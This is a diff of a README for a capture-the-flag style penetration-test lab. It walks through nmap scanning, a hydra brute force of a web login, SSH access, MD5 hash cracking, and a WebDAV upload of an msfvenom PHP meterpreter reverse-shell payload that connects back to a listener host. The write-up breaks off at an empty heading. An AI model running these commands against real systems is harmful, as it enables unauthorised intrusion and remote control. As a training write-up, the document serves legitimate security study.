@@ -1,4 +1,4 @@
-# Red-Team Vs Blue-Team
+# Attackers Vs Defenders
 
 # **NETWORK TOPOLOGY**
 
@@ -13,7 +13,7 @@
 
 # **Red Team - Penetration Test**
 
-### Identify the target IP
+- ### Identify the target IP
 We need to run a network scan to locate the target IP address.
 ```
 netdiscover -r <IP subnet>
@@ -28,7 +28,7 @@ netdiscover -r <IP subnet>
 | 192.168.1.105 | Capstone, Target Machine |
 
 
-### Scan Target IP
+- ### Scan Target IP
 Now we will run a nmap scan to see what services and versions are on the target IP.
 ```
 nmap -sV -v 192.168.1.105
@@ -49,7 +49,7 @@ namp -A -vvv 192.168.1.105
 
 We can see that HTTP port 80 is open and two usernames (hannah and ashton) which may be susceptible to a brute force attack.
 
-### Inspecting the Webserver 
+- ###  Inspecting the Webserver 
 Let's navigate the webserver and take a look.
 
 ![webserver](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/webserver.PNG)
@@ -70,7 +70,7 @@ The *meet_our_team* folder confirms the three users, and each document has refer
 
 Ashton's login screen, we need his password to gain access to his *secret_folder*.
 
-### Further Recon
+- ###  Further Recon
 Let's do a vulnerablity scan on the target IP.
 ```
 nmap -A ---script=vuln -vvv 192.168.1.105
@@ -79,3 +79,115 @@ nmap -A ---script=vuln -vvv 192.168.1.105
 ![vuln-scan3](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/vuln-scan3.jpg)
 ![vuln-scan4](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/vuln-scan4.PNG)
 ![vuln-scan7](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/vuln-scan7.PNG)
+
+Returning from the nmap aggressive scan, we can see vulnerabilities were revealed.
+ - Webdav vulnerability.
+ - SQL Injection vulnerability across all directories on the webserver.
+ - CVE-2017-15710 – Apache httpd vulnerability.
+ 
+ - ###  Brute Forcing
+ Now that we have some usernames and a main target (Ashton), using hydra we can attempt to bruteforce the login for the *secret_folder*.
+ 
+ The CEO (Ashton), has a common password let's use the following command to get Ashton's password.
+ 
+ ```
+ hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/company_folders/secret_folder"
+
+ ```
+![hydra command](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/hydra%20command.PNG)
+![hydra bruteforce](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/hydra%20bruteforce.PNG)
+
+- ###  SSH
+
+```
+ssh ashton@192.168.1.105
+```
+ We can gain ssh access into the server using Ashton's credentials.
+ 
+ ![ssh-ashton](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/ssh-ashton.PNG)
+ ![Ashton-id](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/Ashton-id.PNG)
+ 
+ - ### Flag
+ We find a flag in the root directory.
+ ![Flag](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/Flag.PNG)
+ 
+  Using Ashton's credentials we can also login to the webserver, and access the hidden folder.
+  
+  
+  ![webserver ashton login](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/webserver%20ashton%20login.PNG)
+  
+  
+  - ### Password Hash
+ 
+ 
+  ![connect to corp server](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/connect%20to%20corp%20server.PNG)
+  
+  Inside this folder is a document with instructions on how connect to the *corp_server*. Also in the document are Ryan's hashed credentials and reference to a webdav directory.
+  
+  ![personal-note](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/personal-note.PNG)
+  
+  The hashed md5 password was instantly cracked using Crackstation, revealing the password *linux4u*
+  
+  ![crackstation](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/crackstation.PNG)
+  
+  - ### Webdav
+  We will use Ryan's credentials to login to the webdav server.
+  
+  ![ryans login](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/ryans%20login.PNG)
+  
+  ![webdav](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/webdav.PNG)
+  
+  - ### Reverse Shell
+  - ##### Msfvenom
+  Next we will use msfvenom to upload a shell script to webdav, in order to create a reverse shell.
+  
+  ```
+  msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
+  ```
+  
+  Create the payload *shell.php* with msfvenom.
+  
+  ![msfvenom](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/msfvenom.PNG)
+  
+  - #### Cadaver
+  
+  ```
+  cadaver http://192.168.1.105/webdav
+  ```
+  
+  Using cadaver and Ryan's credentials we accessed webdav, and uploaded the payload to the webdav directory.
+  
+  ![cadaver](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/cadaver.PNG)
+  
+  Use the put command.
+  
+  ![cadaver put-shell](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/cadaver%20put-shell.PNG)
+   
+  The payload was  delievered
+   
+  ![webdav shell](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/webdav%20shell.PNG)
+  
+  - #### Metasploit
+  
+  ```
+  msfconsole
+  ```
+  
+  ```
+  use multi/handler
+  ```
+  
+  Now that the payload has been uploadedthe the webdav server. To create the reverse shell, we need to setup a listener using Metasploit.
+  
+  ![uploaded-shell-webdav](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/uploaded-shell-webdav.PNG)
+  
+  ![metasploit](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/metasploit.PNG)
+  
+  After loading the exploit and activating the shell.php we uploaded earlier by clicking on it on the webserver, the target server connected to our listener and launched a         meterpreter session into their system.
+  
+  ![meterpreter](https://github.com/FRobertAllen/Red-Team-Vs-Blue-Team/blob/main/Images/meterpreter.PNG)
+  
+  - ### Gaining Interactive Shell
+  
+  
+ 
